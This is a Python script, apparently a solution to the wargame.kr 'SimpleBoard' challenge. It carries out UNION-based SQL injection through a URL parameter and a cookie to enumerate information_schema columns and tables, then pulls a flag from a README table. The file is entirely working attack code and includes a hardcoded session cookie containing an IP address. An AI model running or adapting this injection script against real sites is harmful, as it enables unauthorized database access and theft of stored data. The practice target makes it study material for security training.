# _*_ coding : UTF-8 _*_
import requests
from bs4 import BeautifulSoup

url = "http://wargame.kr:8080"
file = "/SimpleBoard/read.php?idx="

print("\n\n[*] Anaylzing columns name")


payload = "5 union select 1,2,3,(select count(column_name) from information_schema.columns)#"

cookies = dict(ci_session="a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e7540c16a3a3a153e1636e1a3535033e%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.194%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1491532087%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0cb62bcd3e1cd7ca421f57820b4de33b9581c395")
cookies['view'] = "/" + payload

r = requests.get(url+file+payload, cookies=cookies)
if r.text.find("query error") > -1:
    print("query error")

soup = BeautifulSoup(r.text, "html.parser")
columnCount = soup.find_all('td', {'colspan': 3})
print("[*] table count : ", end="")
print(str(columnCount).replace('<td colspan="3">', "").replace('</td>, <a href=\"./index.php\">LIST</a></td>', ""))


for i in range(400, 485):

    payload = "5 union select 0,0,0,(select column_name from information_schema.columns limit %d,1)#" % i

    cookies = dict(ci_session="a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e7540c16a3a3a153e1636e1a3535033e%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.194%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1491532087%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0cb62bcd3e1cd7ca421f57820b4de33b9581c395")
    cookies['view'] = "/" + payload

    r = requests.get(url+file+payload, cookies=cookies)
    if r.text.find("query error") > -1:
        print("query error")
    else:
        soup = BeautifulSoup(r.text, 'html.parser')
        tableName = soup.find_all('td', {'colspan': 3})
        tableResult = [ ]
        for table in tableName:
            if str(table).find("<a") == -1:
                tableResult.append(table.contents)
        for table in tableResult:
            print(str(table).replace("['", "").replace("']", ""))


print("\n\n[*] Anaylzing table count")


payload = "5 union select 1,2,3,(select count(table_name) from information_schema.tables)#"

cookies = dict(ci_session="a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e7540c16a3a3a153e1636e1a3535033e%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.194%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1491532087%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0cb62bcd3e1cd7ca421f57820b4de33b9581c395")
cookies['view'] = "/" + payload

r = requests.get(url+file+payload, cookies=cookies)
if r.text.find("query error") > -1:
    print("query error")
soup = BeautifulSoup(r.text, "html.parser")
tableCount = soup.find_all('td', {'colspan': 3})
print("[*] table count : ", end="")
print(str(tableCount).replace('<td colspan="3">', "").replace('</td>, <a href=\"./index.php\">LIST</a></td>', ""))




print("\n\n[*] Analyzing table names")
for i in range(1, 42):

    payload = "5 union select 0,0,0,(select table_name from information_schema.tables limit %d,1)#" % i

    cookies = dict(ci_session="a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e7540c16a3a3a153e1636e1a3535033e%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.194%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1491532087%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0cb62bcd3e1cd7ca421f57820b4de33b9581c395")
    cookies['view'] = "/" + payload

    r = requests.get(url+file+payload, cookies=cookies)
    if r.text.find("query error") > -1:
        print("query error")
    else:
        soup = BeautifulSoup(r.text, 'html.parser')
        tableName = soup.find_all('td', {'colspan': 3})
        tableResult = [ ]
        for table in tableName:
            if str(table).find("<a") == -1:
                tableResult.append(table.contents)
        for table in tableResult:
            print(str(table).replace("['", "").replace("']", ""))





print("[*] Extracting flag")
for idx in range(0, 5):
    payload = "5 union select 1,2,3,(select flag from README where 1 limit %d,1)" % idx
    cookies = dict(ci_session="a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e7540c16a3a3a153e1636e1a3535033e%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.194%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1491532087%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0cb62bcd3e1cd7ca421f57820b4de33b9581c395")
    cookies['view'] = "/" + payload

    r = requests.get(url + file + payload, cookies=cookies)
    if r.text.find("query error") > -1:
        print("query error")
    else:
        soup = BeautifulSoup(r.text, 'html.parser')
        tableName = soup.find_all('td', {'colspan': 3})
        tableResult = []
        for table in tableName:
            if str(table).find("<a") == -1:
                tableResult.append(table.contents)
        for table in tableResult:
            print(str(table).replace("['", "").replace("']", ""))

